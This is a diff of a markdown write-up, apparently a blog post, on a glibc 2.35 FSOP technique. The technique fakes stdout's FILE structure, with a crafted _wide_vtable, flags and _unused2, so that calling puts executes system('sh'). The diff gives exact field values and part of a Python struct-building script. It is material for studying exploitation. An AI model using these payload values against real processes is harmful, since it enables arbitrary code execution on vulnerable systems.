@@ -67,7 +67,6 @@ There are several member variables, and we will only discuss about the necessary
 
 <br/>
 <br/>
-
 ## Following the control flow of `puts`
 ---
 
@@ -132,7 +131,6 @@ From below, We'll examine exactly how it works.
 
 <br/>
 <br/>
-
 ## Missing validation in `_wide_vtable`
 ---
 ```c
@@ -184,9 +182,6 @@ Then calling `puts` will further call `_IO_wfile_jumps->_IO_file_overflow` inste
 
 <br/>
 <br/>
-
-
-
 ## Code Flow
 ---
 Now let's follow the exact code flow to reach arbitrary code execution.
@@ -199,7 +194,6 @@ As there are a few constraints to follow this code path, I brought the constrain
 
 <br/>
 <br/>
-
 ### puts
 ```c
 // https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/ioputs.c#L31
@@ -226,7 +220,6 @@ _IO_puts (const char *str)
 
 <br/>
 <br/>
-
 ### _IO_wfile_overflow
 ```c
 wint_t
@@ -256,8 +249,6 @@ _IO_wfile_overflow (FILE *f, wint_t wch)
 
 <br/>
 <br/>
-
-
 ### _IO_wdoallocbuf
 ```c
 void
@@ -277,8 +268,6 @@ _IO_wdoallocbuf (FILE *fp)
 
 <br/>
 <br/>
-
-
 ## Constraints
 ---
 By satisfying these constraints, calling `puts` will call `system("sh")`; 
@@ -309,7 +298,6 @@ To satisfy `vtable->__xsputn == _IO_wfile_jumps.__overflow`, `fp->vtable` should
 
 <br/>
 <br/>
-
 ### fp->_flags
 ```c
 _flags & _IO_NO_WRITES == 0
@@ -338,20 +326,20 @@ and `stdout->_unused2[20]` to `p64(libc.symbols['system'])+ b"\x00"*4 + p64(libc
 
 <br/>
 <br/>
-
-
 ## Conclusion
 ---
-`fp->_flags == b"\x01\x01;sh;\x00\x00"`
-`fp->_lock == libc.symbols['_IO_2_1_stdout_'] + 0x10`
-`fp->vtable = libc['_IO_wfile_jumps'] - 0x20`
-`fp->_wide_data = libc.symbols['_IO_2_1_stdout_'] - 16`
-`fp->_IO_read_ptr == 0`
-`fp->_IO_write_base == 0`
-`fp->_unused2 = p64(libc.symbols['system'])+ b"\x00"*4 + p64(libc.symbols['_IO_2_1_stdout_'] + 196 - 104)`
+```c
+fp->_flags == b"\x01\x01;sh;\x00\x00"
+fp->_lock == libc.symbols['_IO_2_1_stdout_'] + 0x10
+fp->vtable = libc['_IO_wfile_jumps'] - 0x20
+fp->_wide_data = libc.symbols['_IO_2_1_stdout_'] - 16
+fp->_IO_read_ptr == 0
+fp->_IO_write_base == 0
+fp->_unused2 = p64(libc.symbols['system'])+ b"\x00"*4 + p64(libc.symbols['_IO_2_1_stdout_'] + 196 - 104)
+```
 
 By configuring stdout like above, calling `puts` will call `system("sh")`.
-I made a simple python script to make this struct.
+I made a simple python script to craft this struct easily.
 
 ```python
 libc.address = libc_base
@@ -393,8 +381,6 @@ FSOP = FSOP_struct(flags = u64(b"\x01\x01;sh;\x00\x00"), \
 
 <br/>
 <br/>
-
-
 ## Reference
 ---
 * [Deep dive into FSOP](https://niftic.ca/posts/fsop/)
